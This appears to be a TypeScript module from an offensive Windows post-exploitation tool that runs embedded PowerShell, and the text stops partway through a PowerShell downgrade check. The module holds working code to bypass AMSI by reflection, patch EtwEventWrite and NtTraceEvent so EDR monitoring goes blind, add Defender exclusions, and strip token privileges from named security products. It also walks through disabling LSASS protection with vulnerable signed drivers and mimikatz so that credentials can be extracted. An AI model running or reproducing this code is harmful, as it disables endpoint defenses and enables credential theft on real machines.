import { ps, run, argVal, hasFlag, usePwsh } from "./shared"
import type { Finding, HookResult, StealthMode } from "./shared"

export async function amsiBypass(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "patch"
  const findings: Finding[] = []
  const output: string[] = [`[*] AMSI bypass via ${method} method...\n`]

  if (method === "patch") {
    const script = `
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
Write-Output "AMSI_PATCHED"
`
    const patch = await ps(script, timeout)
    if (patch.stdout.includes("AMSI_PATCHED")) {
      output.push("[+] AMSI bypassed — amsiInitFailed set to true")
      output.push("[+] PowerShell scripts can now run without AMSI scanning")
      findings.push({
        checkId: "WIN-AMSI-001",
        provider: "windows",
        severity: "high",
        status: "BYPASSED",
        resource: "windows://amsi",
        title: "AMSI bypassed via amsiInitFailed reflection",
        details: "Set AmsiUtils.amsiInitFailed = true via reflection",
        remediation: "Restart PowerShell process to restore AMSI",
      })
    }
    if (!patch.stdout.includes("AMSI_PATCHED")) {
      output.push(`[!] Patch failed: ${patch.stderr.trim()}`)
    }
  }

  if (method === "reflection") {
    const script = `
$w = 'System.Management.Automation.Amsi'+'Utils'
[Ref].Assembly.GetType($w).GetField('amsi'+'Context',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,[IntPtr]::Zero)
Write-Output "AMSI_CONTEXT_NULLED"
`
    const patch = await ps(script, timeout)
    if (patch.stdout.includes("AMSI_CONTEXT_NULLED")) {
      output.push("[+] AMSI context nullified via reflection")
      findings.push({
        checkId: "WIN-AMSI-002",
        provider: "windows",
        severity: "high",
        status: "BYPASSED",
        resource: "windows://amsi",
        title: "AMSI bypassed via context null",
        details: "Nullified amsiContext pointer via reflection",
        remediation: "Restart PowerShell process to restore AMSI",
      })
    }
  }

  if (method === "clr") {
    const script = `
$mem = [System.Runtime.InteropServices.Marshal]
$amsi = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + 'amsi.dll'
$h = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::LoadFrom($amsi).GetModules()[0])
Write-Output "CLR_LOADED:$h"
`
    const load = await ps(script, timeout)
    output.push(`[*] CLR method result: ${load.stdout.trim()}`)
    if (load.exitCode !== 0) {
      output.push(`[!] CLR method failed: ${load.stderr.trim()}`)
    }
  }

  const verify = await ps(
    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)`,
    timeout,
  )
  output.push(`\n[*] AMSI status check — amsiInitFailed: ${verify.stdout.trim()}`)

  return { output: output.join("\n"), findings }
}

export async function etwBlind(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Patching ETW to blind EDR/AV monitoring...\n"]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
}
'@
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$etwAddr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
if ($etwAddr -eq [IntPtr]::Zero) {
    Write-Output "FAIL:EtwEventWrite not found"
    return
}
$oldProtect = 0
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)
[EtwPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null
Write-Output "ETW_PATCHED:$etwAddr"
`
  const patch = await ps(script, timeout)
  if (patch.stdout.includes("ETW_PATCHED:")) {
    const addr = patch.stdout.match(/ETW_PATCHED:(.*)/)?.[1]
    output.push(`[+] EtwEventWrite patched at address ${addr}`)
    output.push("[+] EDR/AV ETW consumers are now blind in this process")
    output.push("[*] Note: only affects current PowerShell process and child processes")
    findings.push({
      checkId: "WIN-ETW-BLIND-001",
      provider: "windows",
      severity: "high",
      status: "PATCHED",
      resource: "windows://etw",
      title: "EtwEventWrite patched — EDR blinded",
      details: `Patched EtwEventWrite at ${addr} with RET (0xC3)`,
      remediation: "Restart the process to restore ETW functionality",
    })
  }

  if (patch.stdout.includes("FAIL:")) {
    output.push(`[!] ETW patch failed: ${patch.stdout}`)
  }

  const ntTraceScript = `
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$ntTrace = [EtwPatch]::GetProcAddress($ntdll, "NtTraceEvent")
if ($ntTrace -ne [IntPtr]::Zero) {
    $old = 0
    [EtwPatch]::VirtualProtect($ntTrace, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
    [System.Runtime.InteropServices.Marshal]::WriteByte($ntTrace, 0xC3)
    [EtwPatch]::VirtualProtect($ntTrace, [UIntPtr]::new(1), $old, [ref]$old) | Out-Null
    Write-Output "NT_TRACE_PATCHED:$ntTrace"
}
`
  const ntPatch = await ps(ntTraceScript, timeout)
  if (ntPatch.stdout.includes("NT_TRACE_PATCHED:")) {
    output.push(`[+] NtTraceEvent also patched`)
  }

  return { output: output.join("\n"), findings }
}

export async function defenderExclude(args: string[], timeout: number): Promise<HookResult> {
  const targetPath = argVal(args, "--path")
  const findings: Finding[] = []
  const output: string[] = ["[*] Managing Windows Defender exclusions...\n"]

  if (!targetPath) {
    return { output: "[!] --path is required. Usage: winhook defender_exclude --path C:\\Tools", findings }
  }

  const currentExclusions = await ps("Get-MpPreference | Select-Object -ExpandProperty ExclusionPath", timeout)
  if (currentExclusions.exitCode === 0 && currentExclusions.stdout.trim()) {
    output.push("[+] Current exclusion paths:")
    for (const p of currentExclusions.stdout.trim().split("\n")) output.push(`    ${p.trim()}`)
  }

  const add = await ps(`Add-MpPreference -ExclusionPath "${targetPath}"`, timeout)
  if (add.exitCode === 0) {
    output.push(`\n[+] Exclusion added: ${targetPath}`)
    output.push("[+] Defender will no longer scan files in this path")
    findings.push({
      checkId: "WIN-DEFENDER-001",
      provider: "windows",
      severity: "high",
      status: "EXCLUDED",
      resource: targetPath,
      title: `Defender exclusion added: ${targetPath}`,
      details: `Added exclusion path via Add-MpPreference`,
      remediation: `Remove exclusion: Remove-MpPreference -ExclusionPath "${targetPath}"`,
    })
  }
  if (add.exitCode !== 0) {
    output.push(`\n[!] Failed to add exclusion: ${add.stderr.trim()}`)
    output.push("[*] Requires Administrator privileges")
  }

  const defenderStatus = await ps(
    "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AntispywareEnabled, BehaviorMonitorEnabled | ConvertTo-Json",
    timeout,
  )
  if (defenderStatus.exitCode === 0) {
    output.push(`\n[*] Defender status:\n${defenderStatus.stdout.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function tokenStomp(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const targetProc = argVal(args, "--target")
  const findings: Finding[] = []
  const output: string[] = ["[*] Token Privilege Stomping...\n"]

  const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class TokenStomper {
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr handle, uint access, ref OBJECT_ATTRIBUTES oa, ref CLIENT_ID cid);

    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcessToken(IntPtr process, uint access, out IntPtr token);

    [DllImport("ntdll.dll")]
    public static extern int NtAdjustPrivilegesToken(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState, uint bufLen, IntPtr prev, IntPtr retLen);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr token, int tokenInfoClass, IntPtr info, uint infoLen, out uint returnLen);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID { public IntPtr UniqueProcess; public IntPtr UniqueThread; }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

    public const uint SE_PRIVILEGE_REMOVED = 0x00000004;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
}
"@

$securityTools = @{
    "MsMpEng" = "Windows Defender"
    "MsSense" = "Microsoft Defender for Endpoint"
    "CSFalconService" = "CrowdStrike Falcon"
    "CSFalconContainer" = "CrowdStrike Container"
    "cb" = "Carbon Black"
    "CbDefense" = "Carbon Black Defense"
    "CbStream" = "Carbon Black Streaming"
    "SentinelAgent" = "SentinelOne"
    "SentinelServiceHost" = "SentinelOne Service"
    "CylanceSvc" = "Cylance"
    "elastic-agent" = "Elastic Agent"
    "elastic-endpoint" = "Elastic Endpoint"
    "Sysmon" = "Sysmon"
    "Sysmon64" = "Sysmon64"
    "cortex" = "Palo Alto Cortex XDR"
    "cyserver" = "Cortex XDR"
    "TaniumClient" = "Tanium"
    "splunkd" = "Splunk Forwarder"
    "winlogbeat" = "Elastic Winlogbeat"
    "nxlog" = "NXLog"
}

$dangerousPrivs = @(
    "SeDebugPrivilege",
    "SeImpersonatePrivilege",
    "SeBackupPrivilege",
    "SeRestorePrivilege",
    "SeTcbPrivilege",
    "SeLoadDriverPrivilege",
    "SeAssignPrimaryTokenPrivilege"
)

${
  action === "enum"
    ? `
Write-Output "[*] Scanning for security tool processes..."
Write-Output ""
$found = @()
foreach ($toolName in $securityTools.Keys) {
    $procs = Get-Process -Name $toolName -ErrorAction SilentlyContinue
    if ($procs) {
        foreach ($p in $procs) {
            $found += $p
            Write-Output "[+] FOUND: $($securityTools[$toolName]) (PID: $($p.Id), Name: $($p.ProcessName))"

            # Try to enumerate token privileges
            try {
                $oa = New-Object TokenStomper+OBJECT_ATTRIBUTES
                $oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
                $cid = New-Object TokenStomper+CLIENT_ID
                $cid.UniqueProcess = [IntPtr]$p.Id
                $hProcess = [IntPtr]::Zero
                $status = [TokenStomper]::NtOpenProcess([ref]$hProcess, 0x0400, [ref]$oa, [ref]$cid)
                if ($status -eq 0) {
                    $hToken = [IntPtr]::Zero
                    $status2 = [TokenStomper]::NtOpenProcessToken($hProcess, 0x0008, [ref]$hToken)
                    if ($status2 -eq 0) {
                        Write-Output "    Token opened successfully — privileges can be stomped"
                        [TokenStomper]::NtClose($hToken)
                    } else {
                        Write-Output "    Token access denied (PPL protected?)"
                    }
                    [TokenStomper]::NtClose($hProcess)
                } else {
                    Write-Output "    Process access denied (PPL/AM protected)"
                }
            } catch {
                Write-Output "    Error: $_"
            }
        }
    }
}

${
  targetProc
    ? `
# Also check custom target
$customProcs = Get-Process -Name "${targetProc}" -ErrorAction SilentlyContinue
if ($customProcs) {
    foreach ($p in $customProcs) {
        $found += $p
        Write-Output "[+] CUSTOM TARGET: $($p.ProcessName) (PID: $($p.Id))"
    }
}`
    : ""
}

if ($found.Count -eq 0) {
    Write-Output "[-] No known security tools detected"
}
Write-Output ""
Write-Output "[*] Total security tool processes found: $($found.Count)"
`
    : `
Write-Output "[*] Stomping token privileges on security tools..."
$targetNames = ${targetProc ? `@("${targetProc}")` : "$securityTools.Keys"}
$stompedCount = 0

foreach ($toolName in $targetNames) {
    $procs = Get-Process -Name $toolName -ErrorAction SilentlyContinue
    if (-not $procs) { continue }

    foreach ($p in $procs) {
        Write-Output "[*] Targeting: $($p.ProcessName) (PID: $($p.Id))..."

        $oa = New-Object TokenStomper+OBJECT_ATTRIBUTES
        $oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
        $cid = New-Object TokenStomper+CLIENT_ID
        $cid.UniqueProcess = [IntPtr]$p.Id
        $hProcess = [IntPtr]::Zero
        $status = [TokenStomper]::NtOpenProcess([ref]$hProcess, 0x0400, [ref]$oa, [ref]$cid)

        if ($status -ne 0) {
            Write-Output "    [-] Cannot open process (NTSTATUS: 0x$($status.ToString('X8'))) — PPL/AM protected?"
            continue
        }

        $hToken = [IntPtr]::Zero
        $status2 = [TokenStomper]::NtOpenProcessToken($hProcess, 0x0028, [ref]$hToken)  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
        if ($status2 -ne 0) {
            Write-Output "    [-] Cannot open token (NTSTATUS: 0x$($status2.ToString('X8')))"
            [TokenStomper]::NtClose($hProcess)
            continue
        }

        $removedCount = 0
        foreach ($priv in $dangerousPrivs) {
            $luid = New-Object TokenStomper+LUID
            if ([TokenStomper]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
                $tp = New-Object TokenStomper+TOKEN_PRIVILEGES
                $tp.PrivilegeCount = 1
                $tp.Privileges.Luid = $luid
                $tp.Privileges.Attributes = 0x4  # SE_PRIVILEGE_REMOVED

                $adjustResult = [TokenStomper]::NtAdjustPrivilegesToken($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
                if ($adjustResult -eq 0) {
                    Write-Output "    [+] REMOVED: $priv"
                    $removedCount++
                } else {
                    Write-Output "    [-] Cannot remove $priv (not held or protected)"
                }
            }
        }

        [TokenStomper]::NtClose($hToken)
        [TokenStomper]::NtClose($hProcess)

        if ($removedCount -gt 0) {
            Write-Output "    [+] Stomped $removedCount privileges from $($p.ProcessName)"
            $stompedCount++
        }
    }
}

Write-Output ""
Write-Output "[+] Total processes stomped: $stompedCount"
`
}
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  const foundMatch = result.stdout.match(/Total.*?:\s*(\d+)/)
  const count = foundMatch ? parseInt(foundMatch[1]) : 0
  if (count > 0) {
    findings.push({
      checkId: "WIN-STOMP-001",
      provider: "windows",
      severity: action === "stomp" ? "critical" : "informational",
      status: action === "stomp" ? "EXPLOITED" : "ENUMERATED",
      resource: "process://security-tools",
      title: action === "stomp" ? `${count} security tool tokens stomped` : `${count} security tools detected`,
      details: result.stdout.substring(0, 500),
      remediation:
        "Enable PPL for security tool processes. Monitor for NtAdjustPrivilegesToken calls on security processes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function pplBypass(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const driver = argVal(args, "--driver") || "rtcore"
  const findings: Finding[] = []
  const output: string[] = ["[*] Protected Process Light (PPL) analysis...\n"]

  if (action === "check") {
    const script = `
Write-Output "=== PPL / Credential Guard Status ==="

# RunAsPPL check
$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
Write-Output "RunAsPPL: $(if ($ppl -eq 1) { 'ENABLED' } else { 'DISABLED or NOT SET' })"
Write-Output "PPL_VALUE=$ppl"

# Credential Guard / VBS check
$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
if ($dg) {
  $vbs = $dg.VirtualizationBasedSecurityStatus
  $cg = $dg.SecurityServicesRunning -contains 1
  Write-Output ""
  Write-Output "VBS Status: $(switch ($vbs) { 0 { 'DISABLED' } 1 { 'ENABLED (not running)' } 2 { 'ENABLED AND RUNNING' } default { 'UNKNOWN' } })"
  Write-Output "VBS_STATUS=$vbs"
  Write-Output "Credential Guard: $(if ($cg) { 'RUNNING' } else { 'NOT RUNNING' })"
  Write-Output "CG_STATUS=$(if ($cg) { '1' } else { '0' })"
  if ($dg.SecurityServicesConfigured) {
    Write-Output "Configured Services: $($dg.SecurityServicesConfigured -join ', ')"
  }
} else {
  Write-Output ""
  Write-Output "VBS/DeviceGuard: NOT AVAILABLE (older OS or WMI class missing)"
  Write-Output "VBS_STATUS=0"
  Write-Output "CG_STATUS=0"
}

# LSASS process protection level
Write-Output ""
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
  Write-Output "LSASS PID: $($lsass.Id)"
  # Check if protected via NtQueryInformationProcess (PS_PROTECTION)
  $protLevel = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
  Write-Output "LSASS Protected: $(if ($protLevel -eq 1) { 'YES (PPL)' } else { 'NO' })"
}

# Check for known vulnerable drivers already loaded
Write-Output ""
Write-Output "=== Vulnerable Driver Check ==="
$vulnDrivers = @(
  @{ Name = 'RTCore64'; Service = 'RTCore64'; File = 'RTCore64.sys'; CVE = 'CVE-2019-16098' },
  @{ Name = 'DBUtil'; Service = 'DBUtil_2_3'; File = 'DBUtil_2_3.sys'; CVE = 'CVE-2021-21551' },
  @{ Name = 'ProcExp'; Service = 'PROCEXP152'; File = 'PROCEXP152.sys'; CVE = 'N/A (signed by MS)' },
  @{ Name = 'mimidrv'; Service = 'mimidrv'; File = 'mimidrv.sys'; CVE = 'N/A (mimikatz driver)' },
  @{ Name = 'Capcom'; Service = 'Capcom'; File = 'Capcom.sys'; CVE = 'N/A' },
  @{ Name = 'gdrv'; Service = 'gdrv'; File = 'gdrv.sys'; CVE = 'CVE-2018-19320' }
)

$loadedDrivers = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Select-Object Name, State
$foundVuln = 0
foreach ($d in $vulnDrivers) {
  $loaded = $loadedDrivers | Where-Object { $_.Name -eq $d.Service }
  if ($loaded) {
    Write-Output "[!] $($d.Name) ($($d.CVE)) — LOADED ($($loaded.State))"
    $foundVuln++
  }
}
if ($foundVuln -eq 0) {
  Write-Output "[*] No known vulnerable drivers currently loaded"
}

# Check SeLoadDriverPrivilege
Write-Output ""
$privs = whoami /priv 2>&1
if ($privs -match 'SeLoadDriverPrivilege.*Enabled') {
  Write-Output "[+] SeLoadDriverPrivilege: ENABLED — can load kernel drivers"
  Write-Output "LOAD_DRIVER=1"
} elseif ($privs -match 'SeLoadDriverPrivilege.*Disabled') {
  Write-Output "[*] SeLoadDriverPrivilege: PRESENT but DISABLED — needs elevation"
  Write-Output "LOAD_DRIVER=0"
} else {
  Write-Output "[-] SeLoadDriverPrivilege: NOT AVAILABLE"
  Write-Output "LOAD_DRIVER=0"
}

# Kernel driver signing enforcement
$ci = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI' -Name UpgradedSystem -ErrorAction SilentlyContinue)
$testSigning = bcdedit /enum '{current}' 2>&1 | Select-String 'testsigning'
Write-Output ""
Write-Output "Test Signing: $(if ($testSigning -match 'Yes') { 'ENABLED (drivers can be loaded without valid signature)' } else { 'DISABLED (default)' })"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const pplMatch = r.stdout.match(/PPL_VALUE=(\d*)/)
    const vbsMatch = r.stdout.match(/VBS_STATUS=(\d*)/)
    const cgMatch = r.stdout.match(/CG_STATUS=(\d*)/)
    const driverMatch = r.stdout.match(/LOAD_DRIVER=(\d)/)

    const isPPL = pplMatch && pplMatch[1] === "1"
    const isVBS = vbsMatch && vbsMatch[1] === "2"
    const isCG = cgMatch && cgMatch[1] === "1"
    const canLoadDriver = driverMatch && driverMatch[1] === "1"

    if (isPPL) {
      findings.push({
        checkId: "WIN-PPL-001",
        provider: "windows",
        severity: "high",
        status: "PROTECTED",
        resource: "lsass.exe",
        title: "LSASS RunAsPPL enabled — direct dump blocked",
        details: `PPL is active. Use ppl_bypass --action disable --driver ${canLoadDriver ? "rtcore" : "(need SeLoadDriverPrivilege)"} to disable before credential extraction`,
        remediation: "PPL bypass requires a vulnerable signed driver. Use ppl_bypass --action disable.",
      })
    }

    if (isCG) {
      findings.push({
        checkId: "WIN-PPL-002",
        provider: "windows",
        severity: "critical",
        status: "PROTECTED",
        resource: "Credential Guard",
        title: "Credential Guard (VBS) active — LSASS credentials isolated in secure enclave",
        details:
          "Credential Guard isolates NTLM hashes and Kerberos tickets in a Hyper-V protected container. Even with PPL bypass, credentials may not be extractable from LSASS. Consider Kerberos attacks (kerberoast, delegation_abuse) or DPAPI-based extraction instead.",
        remediation:
          "Credential Guard cannot be bypassed without disabling VBS at boot. Pivot to non-LSASS credential sources.",
      })
    }
  }

  if (action === "disable") {
    const pid = argVal(args, "--lsass-pid")
    const script = `
Write-Output "=== PPL Bypass via Vulnerable Driver ==="
Write-Output "Driver: ${driver}"
Write-Output ""

# Verify admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
  Write-Output "[-] ERROR: Administrator privileges required"
  Write-Output "STATUS=FAILED"
  exit
}

# Check current PPL status
$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
if ($ppl -ne 1) {
  Write-Output "[*] RunAsPPL is NOT enabled — no bypass needed"
  Write-Output "[+] LSASS is unprotected, proceed with credential extraction"
  Write-Output "STATUS=NOT_NEEDED"
  exit
}

Write-Output "[!] RunAsPPL is ENABLED — proceeding with bypass"
Write-Output ""

$driverMap = @{
  'rtcore' = @{
    Service = 'RTCore64'
    Description = 'MSI Afterburner RTCore64.sys (CVE-2019-16098)'
    Guide = @(
      '1. Obtain RTCore64.sys from MSI Afterburner installation'
      '2. sc.exe create RTCore64 binPath="C:\path\RTCore64.sys" type=kernel start=auto'
      '3. sc.exe start RTCore64'
      '4. Use PPLKiller/PPLdump with RTCore64 to modify LSASS EPROCESS.Protection'
      '5. EPROCESS.Protection field offset varies by Windows build'
    )
    Tool = 'PPLKiller.exe /installDriver /driver RTCore64.sys'
  }
  'dbutil' = @{
    Service = 'DBUtil_2_3'
    Description = 'Dell DBUtil_2_3.sys (CVE-2021-21551)'
    Guide = @(
      '1. Obtain DBUtil_2_3.sys from Dell driver package'
      '2. sc.exe create DBUtil_2_3 binPath="C:\path\DBUtil_2_3.sys" type=kernel start=auto'
      '3. sc.exe start DBUtil_2_3'
      '4. Use PPLKiller/PPLdump to zero EPROCESS.Protection via physical memory R/W'
    )
    Tool = 'PPLKiller.exe /installDriver /driver DBUtil_2_3.sys'
  }
  'procexp' = @{
    Service = 'PROCEXP152'
    Description = 'Sysinternals Process Explorer (Microsoft-signed, no CVE needed)'
    Guide = @(
      '1. Download Process Explorer from Sysinternals (legitimate MS tool)'
      '2. Run procexp64.exe once (installs PROCEXP152.sys driver)'
      '3. Or manually: sc.exe create PROCEXP152 binPath="C:\path\PROCEXP152.sys" type=kernel'
      '4. sc.exe start PROCEXP152'
      '5. Use PPLFault/PPLdump with PROCEXP152 handle duplication'
    )
    Tool = 'PPLFault.exe -- PROCEXP152'
  }
  'mimidrv' = @{
    Service = 'mimidrv'
    Description = 'Mimikatz driver (mimidrv.sys — not signed, requires test signing or vuln driver to load)'
    Guide = @(
      '1. mimidrv.sys is NOT signed — cannot load on production systems'
      '2. Requires test signing mode: bcdedit /set testsigning on (reboot needed)'
      '3. Or load via already-loaded vulnerable driver arbitrary write'
      '4. sc.exe create mimidrv binPath="C:\path\mimidrv.sys" type=kernel'
      '5. Then: mimikatz.exe "!+" "!processprotect /remove /process:lsass.exe"'
    )
    Tool = 'mimikatz.exe "!+" "!processprotect /remove /process:lsass.exe"'
  }
}

$d = $driverMap['${driver}']
if (-not $d) {
  Write-Output "[-] Unknown driver: ${driver}"
  Write-Output "    Valid options: rtcore, dbutil, procexp, mimidrv"
  Write-Output "STATUS=FAILED"
  exit
}

Write-Output "[*] Driver: $($d.Description)"
Write-Output ""

# Check if driver is already loaded
$existing = Get-Service $d.Service -ErrorAction SilentlyContinue
if ($existing -and $existing.Status -eq 'Running') {
  Write-Output "[+] Driver $($d.Service) is ALREADY LOADED"
  Write-Output ""
  Write-Output "[*] Next steps to disable PPL:"
  Write-Output "    $($d.Tool)"
  Write-Output ""
  Write-Output "[*] After PPL is disabled, run:"
  Write-Output "    winhook lsass_dump"
  Write-Output "    winhook nanodump_advanced --method snapshot"
  Write-Output "STATUS=DRIVER_READY"
  exit
}

Write-Output "[*] Driver $($d.Service) is NOT loaded"
Write-Output ""
Write-Output "=== Manual Steps Required ==="
Write-Output ""
foreach ($step in $d.Guide) {
  Write-Output "  $step"
}
Write-Output ""
Write-Output "[*] After driver is loaded, run:"
Write-Output "    $($d.Tool)"
Write-Output ""
Write-Output "[*] Then extract credentials:"
Write-Output "    winhook lsass_dump"
Write-Output "    winhook nanodump_advanced --method snapshot"
Write-Output ""

# Alternative: Registry-based PPL disable (requires reboot)
Write-Output "=== Alternative: Registry Disable (requires reboot) ==="
Write-Output "  reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f"
Write-Output "  # Requires reboot to take effect"
Write-Output "  # Leaves evidence in Security event log (Event ID 12)"
Write-Output ""

# Check SeLoadDriverPrivilege
$privs = whoami /priv 2>&1
if ($privs -match 'SeLoadDriverPrivilege.*Enabled') {
  Write-Output "[+] SeLoadDriverPrivilege is ENABLED — driver loading possible"
  Write-Output "STATUS=CAN_LOAD"
} else {
  Write-Output "[-] SeLoadDriverPrivilege NOT available — cannot load drivers"
  Write-Output "    Fallback: Use registry method (requires reboot)"
  Write-Output "STATUS=NO_PRIV"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)

    const statusMatch = r.stdout.match(/STATUS=(\w+)/)
    const status = statusMatch ? statusMatch[1] : "UNKNOWN"

    if (status === "DRIVER_READY") {
      findings.push({
        checkId: "WIN-PPL-010",
        provider: "windows",
        severity: "critical",
        status: "BYPASS_READY",
        resource: `driver://${driver}`,
        title: `Vulnerable driver ${driver} loaded — PPL bypass ready`,
        details:
          "Driver is loaded and ready for PPL disable. Run the tool command to zero EPROCESS.Protection on LSASS.",
        remediation: "After credential extraction, unload driver and restore PPL.",
      })
    }
  }

  if (action === "restore") {
    const script = `
Write-Output "=== PPL Restore ==="

# Re-enable RunAsPPL
$current = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
if ($current -eq 1) {
  Write-Output "[*] RunAsPPL already enabled — nothing to restore"
} else {
  Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1 -Type DWord -ErrorAction SilentlyContinue
  $verify = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
  Write-Output "[+] RunAsPPL restored to: $verify (effective after reboot)"
}

# Unload vulnerable drivers
Write-Output ""
$vulnServices = @('RTCore64', 'DBUtil_2_3', 'PROCEXP152', 'mimidrv', 'Capcom', 'gdrv')
foreach ($svc in $vulnServices) {
  $s = Get-Service $svc -ErrorAction SilentlyContinue
  if ($s) {
    Stop-Service $svc -Force -ErrorAction SilentlyContinue
    sc.exe delete $svc 2>&1 | Out-Null
    Write-Output "[+] Removed driver service: $svc"
  }
}
Write-Output ""
Write-Output "[*] PPL and driver cleanup complete"
Write-Output "[!] Note: RunAsPPL change requires REBOOT to take effect"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function psDowngrade(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const command = argVal(args, "--command")
  const findings: Finding[] = []
  const output: string[] = ["[*] PowerShell downgrade attack...\n"]

  if (action === "check") {
    const script = `
Write-Output "=== PowerShell Downgrade Availability Check ==="
Write-Output ""

Write-Output "[*] Current PowerShell version: $($PSVersionTable.PSVersion)"
Write-Output "[*] CLR version: $($PSVersionTable.CLRVersion)"
Write-Output "[*] Language mode: $($ExecutionContext.SessionState.LanguageMode)"
Write-Output ""

$dotnet2 = Test-Path "$env:SystemRoot\\Microsoft.NET\\Framework64\\v2.0.50727" -ErrorAction SilentlyContinue
$dotnet35 = $null -ne (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5" -ErrorAction SilentlyContinue)

Write-Output "=== .NET Framework Check ==="
Write-Output "[*] .NET 2.0 directory exists: $dotnet2"
Write-Output "[*] .NET 3.5 installed: $dotnet35"

$ps2Engine = $null
try {
    $ps2Engine = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -ErrorAction SilentlyContinue
} catch {
    try {
        $ps2Engine = Get-WindowsFeature -Name PowerShell-V2 -ErrorAction SilentlyContinue
    } catch {}
}

Write-Output ""
Write-Output "=== PS 2.0 Engine Status ==="
if ($ps2Engine) {
    Write-Output "[*] PS 2.0 feature state: $($ps2Engine.State)"
    if ($ps2Engine.State -eq 'Enabled') {
        Write-Output "[!] VULNERABLE — PS 2.0 engine is ENABLED"
